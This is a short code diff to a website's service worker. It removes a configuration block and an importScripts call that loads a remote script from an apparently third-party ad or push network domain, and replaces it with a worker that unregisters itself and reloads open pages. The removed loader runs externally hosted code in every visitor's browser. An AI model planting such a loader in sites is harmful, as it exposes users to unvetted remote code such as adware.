@@ -1,6 +1,6 @@
-self.options = {
-    "domain": "5gvci.com",
-    "zoneId": 11340585
-}
-self.lary = ""
-importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
+self.addEventListener('install', () => self.skipWaiting());
+self.addEventListener('activate', (e) => {
+  e.waitUntil(self.registration.unregister()
+    .then(() => self.clients.matchAll())
+    .then((cs) => cs.forEach((c) => c.navigate(c.url))));
+});
